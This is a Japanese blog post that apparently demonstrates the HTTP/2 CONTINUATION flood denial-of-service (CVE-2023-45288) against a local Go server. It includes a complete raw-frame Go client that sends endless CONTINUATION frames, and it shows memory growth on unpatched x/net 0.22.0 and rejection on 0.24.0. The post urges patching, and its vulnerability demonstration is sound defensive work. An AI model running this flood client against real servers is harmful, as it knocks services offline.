# HTTP/2 の脆弱性 CONTINUATION flood について

まとめ

- patch を適応しましょう
  - Go は 1.22.2 にあげましょう
- 自分で立てたローカルで遊ぶだけにしてください

**[目次]**

```
* [CONTINUATION flood とは](#continuation-flood-とは)
* [サーバーの準備](#サーバーの準備)
* [クライアントの実装](#クライアントの実装)
  * [接続する](#接続する)
  * [Setting Frame](#setting-frame)
  * [Headers Frame](#headers-frame)
  * [Continuation Frame](#continuation-frame)
  * [動作確認: x/net 0.24.0](#動作確認:-x/net-0.24.0)
  * [動作確認: x/net 0.22.0](#動作確認:-x/net-0.22.0)
* [おまけ](#おまけ)
  * [GODEBUG について](#godebug-について)
  * [クライアント側のコード全体](#クライアント側のコード全体)
  * [Go でのパッチ内容](#go-でのパッチ内容)
* [Links](#links)
```

## CONTINUATION flood とは

[この記事](https://www.bleepingcomputer.com/news/security/new-http-2-dos-attack-can-crash-web-servers-with-a-single-connection/)にわかりやすい図がありますが、1つの HTTP/2 ストリームの中で、クライアントから**任意のヘッダーを無限に送れてしまう DoS 攻撃**です。

（Go 実装において）一定値以上はメモリに載せないようにしたり工夫しているが受け取りは続き、圧縮ヘッダの解凍などがサーバーの負荷になる。
さらにハフマン符号の圧縮とかだと、圧縮より解凍側の負荷が大きいっていう認識でいます。

Go では [CVE-2023-45288](https://github.com/golang/go/issues/65051) の脆弱性として登録されており、Node, Envoy など[他言語・FW においても報告されてます](https://www.bleepingcomputer.com/news/security/new-http-2-dos-attack-can-crash-web-servers-with-a-single-connection/)。

（公開されてるということは）すでにパッチは適応されていると思うので、ご自身の使ってるモノに問題がないかご確認をお願いいたします。
（Go src での修正内容は[こちら](https://go-review.googlesource.com/c/go/+/576076/2/src/net/http/h2_bundle.go)で、1.22.2 のパッチから取り込まれています。）

## サーバーの準備

今回はクライアント側から DoS をやるのが目的なので、サーバーは適当に用意しておきます。

``` go
package main

import (
	"flag"
	"fmt"
	"net/http"
	"runtime"
	"time"

	"golang.org/x/net/http2"
)

func checkMem() {
	for range time.Tick(1 * time.Second) {
		var m runtime.MemStats
		runtime.ReadMemStats(&m)
		fmt.Printf("Alloc = %v MiB", m.Alloc/1024/1024)
		fmt.Printf("\tTotalAlloc = %v MiB", m.TotalAlloc/1024/1024)
		fmt.Printf("\tSys = %v MiB", m.Sys/1024/1024)
		fmt.Printf("\tNumGC = %v\n", m.NumGC)
	}
}

func main() {
	printMemory := flag.Bool("m", false, "memory check")
	flag.Parse()

	if printMemory != nil && *printMemory {
		go checkMem()
	}

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "Hello, HTTP/2 world!")
	})

	server := http.Server{Addr: ":8080", Handler: handler}

	http2.ConfigureServer(&server, &http2.Server{}) // HTTP/2 を有効にする
	if err := server.ListenAndServeTLS("server.crt", "server.key"); err != nil {
		panic(err)
	}
}
```

TLS が必要な実装になっているため、以下のようになんちゃってで証明書と秘密鍵を作成してます。

```
openssl req -x509 -newkey rsa:2048 -nodes -keyout server.key -out server.crt -days 365
```

この時点で以下のようなファイル構成になってます。

```
.
├── go.mod
├── go.sum
├── main.go
├── server.crt
└── server.key
```

以下のようにレスポンスが返ってくれば成功です。

``` sh
$ curl --insecure --http2 https://localhost:8080

Hello, HTTP/2 world!%
```

## クライアントの実装

まずは通常のクライアントから確認します。

Go では HTTP2 かを区別せずに、同一の http クライアントで扱えます。
（以下では『以下では自己証明書に対するアクセスを許可するため』に一工夫しています。）

``` go
package main

import (
	"crypto/tls"
	"fmt"
	"net/http"

	"golang.org/x/net/http2"
)

func main() {
	client := http.Client{
		Transport: &http2.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // 自己署名証明書を使用する場合
			},
		},
	}

	req, err := http.NewRequest("GET", "https://localhost:8080", nil)
	if err != nil {
		panic(err)
	}

	// ヘッダーのカスタマイズ
	req.Header.Add("Custom-Header", "MyValue")

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	fmt.Printf("Protocol: %s\n", resp.Proto)
}
```

この実装では高レベルな抽象化がなされており、脆弱性をつくような攻撃はできません。

そこで HTTP/2 の仕様を（ちょっとだけ）理解し、いい感じにアクセスしてみます。

### 接続する

ベースは TCP であるため、まずは TCP を繋げます。

``` go
// ここに色々書いてく。
func customHttp2Call(conn net.Conn) {
}

func main() {
	// TLS 接続の設定
	tlsConfig := &tls.Config{
		// 実運用では危険。
		InsecureSkipVerify: true,
		// HTTP/2 を明示的に指定
		NextProtos: []string{"h2"},
	}

	// TLS 接続を確立
	conn, err := tls.Dial("tcp", "localhost:8080", tlsConfig)
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	customHttp2Call(conn)
}
```

次に、以下の 16 新数の ASCII 文字列をサーバーとの接続時にクライアントから送る必要があります。

```
0x505249202a20485454502f322e300d0a0d0a534d0d0a0d0a
```

``` sh
# ASCII に直した場合。
$ echo '505249202a20485454502f322e300d0a0d0a534d0d0a0d0a' | xxd -r -p

PRI * HTTP/2.0

SM
```

``` go
const (
	// RFC 7540 3.5 HTTP/2 Connection Preface
	// https://datatracker.ietf.org/doc/html/rfc7540#section-3.5
	http2ClientPreface = "505249202a20485454502f322e300d0a0d0a534d0d0a0d0a"
)

func customHttp2Call(conn net.Conn) {
	prefaceBytes, _ := hex.DecodeString(http2ClientPreface)
	conn.Write(prefaceBytes)
}
```

これで HTTP2 として正常に接続が開始できるようになりました。

RFC 的には [7540 #3.5](https://datatracker.ietf.org/doc/html/rfc7540#section-3.5) に記載があり、Go の src では [x/net/http2/http2.go](https://github.com/golang/net/blob/ec05fdcd71141c885f3fb84c41d1c692f094ccbe/http2/http2.go#L53-L55) に定義があります。

続いて Setting -> Header -> CONTINUATION Frame (あれば) -> Data Frame (あれば) と続けます。

### Setting Frame

唐突に Frame という概念が出てきましたが、[RFC7540 #6](https://datatracker.ietf.org/doc/html/rfc7540#section-6) に定義があり、DATA, HEADERS, PRIORITY, SETTINGS など計 10 種類の Frame が存在します。

Go では [Framer](https://github.com/golang/net/blob/ec05fdcd71141c885f3fb84c41d1c692f094ccbe/http2/frame.go#L265-L333) を使って Frame をやりとりしていきます。

ここでは挨拶がわりにクライアントの希望する設定を, SETTINGS Frame としてサーバーに送りつけてみました。

``` go
func customHttp2Call(conn net.Conn) {
	// ...

	framer := http2.NewFramer(conn, conn)

	// framer.WriteRawFrame(http2.FrameSettings, 0, 0, []byte{})
	framer.WriteSettings(
		http2.Setting{
			ID:  http2.SettingEnablePush,
			Val: 0,
		},
		http2.Setting{
			ID:  http2.SettingInitialWindowSize,
			Val: 4194304,
		},
		http2.Setting{
			ID:  http2.SettingHeaderTableSize,
			Val: 4096,
		},
	)
}
```

### Headers Frame

続いて Headers Frame を投げつけます。

いきなり CONTINUATION とか無理なん？と思われるかもしれませんが, [rfc7540 #6.10](https://datatracker.ietf.org/doc/rfc7540/) に記載があるように、CONTINUATION の前には END_HEADERS のセットされてない HEADERS などが必要なんです。

> A CONTINUATION frame MUST be preceded by a HEADERS, PUSH_PROMISE or CONTINUATION frame without the END_HEADERS flag set. A recipient that observes violation of this rule MUST respond with a connection error (Section 5.4.1) of type PROTOCOL_ERROR.

``` go
func customHttp2Call(conn net.Conn) {
	// ...

	hbuf := bytes.NewBuffer([]byte{})
	henc := hpack.NewEncoder(hbuf)

	henc.WriteField(hpack.HeaderField{Name: ":authority", Value: "localhost:8080"})
	henc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	henc.WriteField(hpack.HeaderField{Name: ":path", Value: "/"})
	henc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})

	// 今回は決めうちで stream 1 を使っている。
	err = framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		BlockFragment: hbuf.Bytes(),
		EndHeaders: false,
	})
}
```

CONTINUATION Frame をこの後に続ける予定なので、EndHeaders フィールドは false にしておきます。

順調です。

### Continuation Frame

続いて本命の Continuation Frame を投げつけます。

``` go
var (
	//go:embed dummy-key
	dummyKey string

	//go:embed dummy-value
	dummyValue string
)

func customHttp2Call(conn net.Conn) {
	// ...

	hbuf.Reset()
	henc = hpack.NewEncoder(hbuf)
	henc.WriteField(hpack.HeaderField{Name: dummyKey, Value: dummyValue})
	henc.WriteField(hpack.HeaderField{Name: dummyValue, Value: dummyKey}) // 逆にしたのも送る。
	continuationHeaders := hbuf.Bytes()

	N := 1_000_000_000_000
	for i := 0; i < N; i++ {
		if err := framer.WriteContinuation(1, i == N-1, continuationHeaders); err != nil {
			log.Fatal("write headers error: ", err)
		}
	}

}
```

今回はダミーの header を作って送っています。

``` sh
cat /dev/random | head -c 1000 | base64 > dummy-key
cat /dev/random | head -c 1000 | base64 > dummy-value
```

この Header 単体だとエラーが出ますが、今回は負荷をかけることが目的なので特に気にせず進みます。

### 動作確認: x/net 0.24.0

http2 の実装が入っている x/net ですが、[脆弱性のパッチが当たったものは 0.24.0](https://pkg.go.dev/golang.org/x/net?tab=versions) となっています。

``` sh
# サーバー側の x/net を最新にする。
go get -u golang.org/x/net@v0.24.0
```

先ほどのクライアントからサーバーを叩き、サーバー側のメモリを確認してみます。

リクエスト送信直後に PROTOCOL_ERROR が発生していることがわかります。

``` sh
$ go run main.go -m

Alloc = 0 MiB   TotalAlloc = 0 MiB      Sys = 7 MiB     NumGC = 0
Alloc = 0 MiB   TotalAlloc = 0 MiB      Sys = 7 MiB     NumGC = 0
Alloc = 0 MiB   TotalAlloc = 0 MiB      Sys = 7 MiB     NumGC = 0
2024/04/09 16:33:08 http2: server connection error from [::1]:58363: connection error: PROTOCOL_ERROR
Alloc = 0 MiB   TotalAlloc = 0 MiB      Sys = 7 MiB     NumGC = 0
Alloc = 0 MiB   TotalAlloc = 0 MiB      Sys = 7 MiB     NumGC = 0
Alloc = 0 MiB   TotalAlloc = 0 MiB      Sys = 7 MiB     NumGC = 0
```

クライアントにもエラーが出ており、一定値以上送信されないようになっていることがわかりました。

```
2024/04/09 16:33:09 write headers error: write tcp [::1]:58363->[::1]:8080: write: broken pipe
exit status 1
```

### 動作確認: x/net 0.22.0

``` sh
# サーバー側の x/net を脆弱性対応前に戻す。
go get -u golang.org/x/net@v0.22.0
```

同じように先ほどのクライアントからサーバーを叩き、サーバー側のメモリを確認してみます。

``` sh
Alloc = 0 MiB   TotalAlloc = 0 MiB      Sys = 7 MiB     NumGC = 0
Alloc = 2 MiB   TotalAlloc = 40 MiB     Sys = 12 MiB    NumGC = 11
Alloc = 3 MiB   TotalAlloc = 171 MiB    Sys = 12 MiB    NumGC = 48
Alloc = 2 MiB   TotalAlloc = 303 MiB    Sys = 12 MiB    NumGC = 86
Alloc = 2 MiB   TotalAlloc = 436 MiB    Sys = 12 MiB    NumGC = 124
Alloc = 1 MiB   TotalAlloc = 568 MiB    Sys = 12 MiB    NumGC = 162
Alloc = 2 MiB   TotalAlloc = 674 MiB    Sys = 12 MiB    NumGC = 192
Alloc = 1 MiB   TotalAlloc = 806 MiB    Sys = 12 MiB    NumGC = 230
Alloc = 0 MiB   TotalAlloc = 938 MiB    Sys = 12 MiB    NumGC = 268
Alloc = 0 MiB   TotalAlloc = 1070 MiB   Sys = 12 MiB    NumGC = 306
Alloc = 3 MiB   TotalAlloc = 1192 MiB   Sys = 12 MiB    NumGC = 340
Alloc = 2 MiB   TotalAlloc = 1324 MiB   Sys = 12 MiB    NumGC = 378
Alloc = 0 MiB   TotalAlloc = 1455 MiB   Sys = 12 MiB    NumGC = 416
Alloc = 2 MiB   TotalAlloc = 1586 MiB   Sys = 12 MiB    NumGC = 453
Alloc = 3 MiB   TotalAlloc = 1716 MiB   Sys = 12 MiB    NumGC = 490
Alloc = 2 MiB   TotalAlloc = 1848 MiB   Sys = 12 MiB    NumGC = 528
Alloc = 1 MiB   TotalAlloc = 1980 MiB   Sys = 12 MiB    NumGC = 566
Alloc = 3 MiB   TotalAlloc = 2111 MiB   Sys = 12 MiB    NumGC = 603
Alloc = 1 MiB   TotalAlloc = 2241 MiB   Sys = 12 MiB    NumGC = 641
Alloc = 1 MiB   TotalAlloc = 2374 MiB   Sys = 12 MiB    NumGC = 679
Alloc = 0 MiB   TotalAlloc = 2506 MiB   Sys = 12 MiB    NumGC = 717
Alloc = 0 MiB   TotalAlloc = 2639 MiB   Sys = 13 MiB    NumGC = 755
Alloc = 1 MiB   TotalAlloc = 2765 MiB   Sys = 13 MiB    NumGC = 791
```

出力内容は [runtime MemStats](https://github.com/golang/go/blob/9f3f4c64dbfd37ef9f7113708a706a8099d72fd9/src/runtime/mstats.go#L52-L332) から取得したものになりますが、**20 秒でトータル 3 GB のメモリがヒープに割り当てられ、800 回ほどの GC** が走ってしまっていることが分かります。

## おまけ

### GODEBUG について

以下のような DEBUG フラグを指定しすると http2 の通信を詳しく確認できます。

``` sh
$ GODEBUG=http2debug=2 go run main.go
```

GODEBUG 全体についてのドキュメントとして以下のリンクは見つけたのですが、より詳しい情報についてご存知の方は教えてください。
https://go.dev/doc/godebug

### クライアント側のコード全体

``` go
package main

import (
	"bytes"
	"crypto/tls"
	_ "embed"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"strings"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

const (
	// RFC 7540 3.5 HTTP/2 Connection Preface
	// https://datatracker.ietf.org/doc/html/rfc7540#section-3.5
	http2ClientPreface = "505249202a20485454502f322e300d0a0d0a534d0d0a0d0a"
)

var (
	//go:embed dummy-key
	dummyKey string

	//go:embed dummy-value
	dummyValue string
)

func customHttp2Call(conn net.Conn) {
	var err error

	prefaceBytes, _ := hex.DecodeString(http2ClientPreface)
	conn.Write(prefaceBytes)

	framer := http2.NewFramer(conn, conn)

	framer.WriteSettings(
		http2.Setting{
			ID:  http2.SettingEnablePush,
			Val: 0,
		},
		http2.Setting{
			ID:  http2.SettingInitialWindowSize,
			Val: 4194304,
		},
		http2.Setting{
			ID:  http2.SettingHeaderTableSize,
			Val: 4096,
		},
	)

	hbuf := bytes.NewBuffer([]byte{})
	henc := hpack.NewEncoder(hbuf)

	henc.WriteField(hpack.HeaderField{Name: ":authority", Value: "localhost:8080"})
	henc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	henc.WriteField(hpack.HeaderField{Name: ":path", Value: "/"})
	henc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	henc.WriteField(hpack.HeaderField{Name: "custom-header", Value: "MyValue"})
	henc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: "gzip"})
	henc.WriteField(hpack.HeaderField{Name: "user-agent", Value: "Foo Bar"})

	err = framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		BlockFragment: hbuf.Bytes(),
		// EndHeaders:    true,
		// EndStream:     true,
		EndHeaders: false,
	})

	if err != nil {
		log.Fatal("write headers error: ", err)
	}

	hbuf.Reset()
	henc = hpack.NewEncoder(hbuf)
	dummyKey = strings.TrimSuffix(dummyKey, "\n")
	dummyValue = strings.TrimSuffix(dummyValue, "\n")
	henc.WriteField(hpack.HeaderField{Name: dummyKey, Value: dummyValue})
	henc.WriteField(hpack.HeaderField{Name: dummyValue, Value: dummyKey}) // 逆にしたのも送る。
	continuationHeaders := hbuf.Bytes()

	N := 1_000_000_000_000
	for i := 0; i < N; i++ {
		if err := framer.WriteContinuation(1, i == N-1, continuationHeaders); err != nil {
			log.Fatal("write headers error: ", err)
		}
	}

	frames := make([]http2.Frame, 0)
	for {
		fmt.Println("----- for -----")
		frame, err := framer.ReadFrame()
		if err != nil {
			log.Fatal("read frame error: ", err)
		}
		frames = append(frames, frame)

		if frame.Header().Flags.Has(http2.FlagHeadersEndStream) {
			fmt.Printf("head ended-----: %v\n", frame)
		}

		if frame.Header().Type == http2.FrameData && frame.Header().Flags.Has(http2.FlagDataEndStream) {
			// end of stream !!!
			break
		}
	}

	for _, frame := range frames {
		switch frame := frame.(type) {
		case *http2.DataFrame:
			log.Printf("data frame: %s\n", frame.Data())
			data := frame.Data()
			fmt.Printf("data: %v\n", data)
			fmt.Printf("string(data): %v\n", string(data))
		case *http2.HeadersFrame:
			log.Printf("headers frame: %s\n", frame.Header())
		default:
			log.Printf("frame: %v\n", frame.Header())
		}
	}
}

func main() {
	// TLS 接続の設定
	tlsConfig := &tls.Config{
		// 実運用では危険。
		InsecureSkipVerify: true,
		// HTTP/2 を明示的に指定
		NextProtos: []string{"h2"},
	}

	// TLS 接続を確立
	conn, err := tls.Dial("tcp", "localhost:8080", tlsConfig)
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	customHttp2Call(conn)
}
```

### Go でのパッチ内容

Go src での修正内容は[こちら の diff](https://go-review.googlesource.com/c/go/+/576076/2/src/net/http/h2_bundle.go)で、1.22.2 のパッチから取り込まれています。

x/net としての v0.22.0 から v0.24.0 の[差分はこちら](https://github.com/golang/net/compare/v0.22.0..v0.24.0)になります。

## Links

- [Qiita: Goで見るHTTP/2](https://qiita.com/kohey_eng/items/b4217f54e93ad66445dc)
    - Go で HTTP/2 を理解するのに助かった記事
- https://datatracker.ietf.org/doc/html/rfc7540
    - HTTP/2 の RFC 7540
- https://http2.github.io/
    - 色々まとまってるところ
- https://github.com/golang/go/compare/go1.22.1..go1.22.2
    - Go 1.22.2 と 1.22.1 の差分
